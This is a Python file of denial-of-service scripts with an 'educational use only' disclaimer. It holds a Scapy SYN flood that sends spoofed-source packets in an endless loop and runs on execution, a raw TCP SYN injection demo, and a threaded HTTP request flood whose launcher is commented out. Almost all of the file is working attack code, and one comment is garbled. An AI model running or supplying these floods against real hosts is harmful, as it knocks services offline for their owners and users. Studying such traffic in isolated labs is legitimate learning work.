"""
⚠️ DISCLAIMER:
This script is for educational and ethical hacking learning purposes only.
Do not use it against live systems or networks without explicit authorization.

Author: Bar Cohen
"""

# ================================== SYN Flood (Scapy) ==============================================
# SYN Flood Simulation with Scapy – Simulates a TCP SYN flood using raw packet crafting for learning how DoS works at the transport layer.
from scapy.all import *

# Function to send SYN packets
def send_syn(target_ip, target_port):
    while True:
        # Craft the SYN packet with spoofed source IP and random source port
        ip_pkt = IP(src="10.0.0.1", dst=target_ip)
        syn_pkt = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip_pkt / syn_pkt

        # Send a single packet per iteration (can be adjusted)
        send(packet, verbose=False)

# Target IP and port (example for test environment)
target_ip = '192.168.56.101'  # Simulated target (e.g., in TryHackMe or HackTheBox)
target_port = 80  # HTTP port

# Call the function to send SYN packets
send_syn(target_ip, target_port)

# ========================================= TCP Connection Attempt via Socket + Scapy =======================================
# TCP Socket & Packet Crafting Demo – A hybrid demo using Python sockets and Scapy to explore TCP connection logic and raw packet injection (educational only).
import socket
from scapy.all import IP, TCP, send  # Importing from Scapy

# Function for demonstrating TCP connection via socket, and sending raw packet via Scapy
def send_packet(target_ip, target_port):
    # Creating a TCP connection (simulation)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Attempt to connect to the target
        s.connect((target_ip, target_port))
        print(f"[*] Connection established to {target_ip}:{target_port}")

        # Demonstration: sending raw packet using Scapy (not via socket)
        ip = IP(src="10.0.0.1", dst=target_ip)
        syn = TCP(sport=1234, dport=target_port, flags="S", seq=12345)
        send(ip/syn, count=5, verbose=False)  # Reduce count for safer simulation

    except Exception as e:
        print(f"[*] Error occurred: {e}")
    finally:
        # Closing the TCP connection
        s.close()

# Target IP and port
target_ip = '192.168.56.101'  # Simulated target in local virtual lab
target_port = 80

# Function call (commented out by default)
# send_packet(target_ip, target_port)

# ================================= Basic HTTP Threaded Flood Simulation ===============================================
# Threaded HTTP Request Stress Test – Spawns multiple threads to send HTTP requests to a test server. For educational use only in isolated environments.
import requests
import threading

def attack():
    while True:
        try:
            requests.get("https://example.com", timeout=2)
        except:
            pass

# Run 100 threads simultaneously
#for i in range(100): # The note must be downloaded for use.
#    t = threading.Thread(target=attack)
#    t.start()

